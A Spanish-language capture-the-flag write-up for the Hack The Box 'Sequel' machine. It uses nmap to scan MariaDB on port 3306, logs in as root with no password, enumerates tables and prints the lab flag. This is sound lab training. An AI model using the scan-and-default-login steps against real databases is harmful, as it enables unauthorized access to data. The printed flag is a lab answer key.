+++
title = "Sequel"
description = "Máquina de Starting Point enfocada en la enumeración de servicios y el acceso a una base de datos MariaDB."

platform = "HackTheBox"
OS = "Linux"
difficulty = "Very-Easy"

tags = [
"MariaDB",
"SQL",
"Starting Point",
"Fundamental Exploitation"
]

image = "/images/writeups/Sequel/sequel.png"
+++

### Descripción general

**Sequel** es una máquina perteneciente a **Starting Point** de Hack The Box. Está diseñada para practicar conceptos fundamentales de enumeración de servicios y acceso a una base de datos **MariaDB**.

El objetivo consiste en identificar el servicio de base de datos expuesto, establecer una conexión y realizar una enumeración básica hasta localizar la bandera almacenada en la base de datos.

---

### Enumeración

Comenzamos verificando la conectividad con la máquina mediante **Ping**:

```bash
ping <TARGET_IP>
```

La máquina responde correctamente, por lo que continuamos con la enumeración del servicio utilizando **Nmap**:

```bash
sudo nmap -sC -sV -p 3306 -sS --min-rate 5000 -Pn -T4 <TARGET_IP>
```

El escaneo muestra el siguiente resultado:

```text
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 65
|   Capabilities flags: 63486
|   Status: Autocommit
|   Auth Plugin Name: mysql_native_password
```

El puerto `3306/tcp` se encuentra abierto y corresponde al servicio de **MySQL/MariaDB**.

Nmap identifica específicamente la versión:

```text
10.3.27-MariaDB-0+deb10u1
```

Con el servicio identificado, intentamos establecer una conexión utilizando el cliente de **MariaDB**:

```bash
sudo mysql -h <TARGET_IP> -u root --skip-ssl
```

La conexión es exitosa y obtenemos acceso al monitor de MariaDB:

```text
Welcome to the MariaDB monitor.
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10
```

---

### Acceso inicial

Una vez dentro de MariaDB, comenzamos enumerando las bases de datos disponibles:

```sql
SHOW DATABASES;
```

`SHOW DATABASES;` permite listar las bases de datos disponibles en el servidor.

El servidor devuelve:

```text
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```

La base de datos `htb` resulta relevante, por lo que procedemos a seleccionarla:

```sql
USE htb;
```

`USE` permite seleccionar la base de datos sobre la que se ejecutarán las siguientes consultas.

A continuación, enumeramos las tablas disponibles:

```sql
SHOW TABLES;
```

`SHOW TABLES;` muestra las tablas existentes dentro de la base de datos seleccionada.

Obtenemos:

```text
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
```

Encontramos las tablas `config` y `users`. Continuamos examinando la estructura de `config`:

```sql
DESCRIBE config;
```

`DESCRIBE` permite consultar la estructura de una tabla, mostrando sus columnas y tipos de datos.

El resultado muestra los siguientes campos:

```text
+-------+---------------------+
| Field | Type                |
+-------+---------------------+
| id    | bigint(20) unsigned |
| name  | text                |
| value | text                |
+-------+---------------------+
```

Para consultar los registros almacenados en la tabla utilizamos:

```sql
SELECT * FROM config;
```

`SELECT` permite recuperar datos de una tabla. El carácter `*` indica que queremos obtener todas las columnas.

Entre los resultados encontramos un registro relacionado con la bandera:

```text
| 5 | flag | 7b4bec00d1a39e3dd4e021ec3d915da8 |
```

Finalmente, utilizamos una condición `WHERE` para consultar específicamente el registro cuyo `id` es `5`:

```sql
SELECT * FROM config WHERE id = 5;
```

`WHERE` permite filtrar los resultados según una condición determinada.

El resultado confirma la presencia de la bandera:

```text
+----+------+----------------------------------+
| id | name | value                            |
+----+------+----------------------------------+
|  5 | flag | 7b4bec00d1a39e3dd4e021ec3d915da8 |
+----+------+----------------------------------+
```

![sql.es.png](/images/writeups/Sequel/sql.es.png)

---

### Bandera

La bandera encontrada en la tabla `config` es:

```text
7b4bec00d1a39e3dd4e021ec3d915da8
```

---

### Conclusión

**Sequel** presenta un escenario sencillo basado en la enumeración de un servicio **MariaDB** y la interacción directa con una base de datos.

El proceso seguido fue:

```text
Enumeración
    ↓
Identificación del puerto 3306
    ↓
Detección de MariaDB
    ↓
Conexión mediante el cliente MariaDB
    ↓
Enumeración de bases de datos
    ↓
Selección de la base de datos htb
    ↓
Enumeración de tablas
    ↓
Identificación de la tabla config
    ↓
Enumeración de registros
    ↓
Obtención de la bandera
```

A pesar de su dificultad **Very Easy**, la máquina permite practicar conceptos fundamentales relacionados con la enumeración de servicios de bases de datos, el uso del cliente MariaDB y las consultas SQL básicas para navegar por una base de datos y localizar información específica.

---

### [Estado: Completada](https://labs.hackthebox.com/achievement/machine/3933963/403)
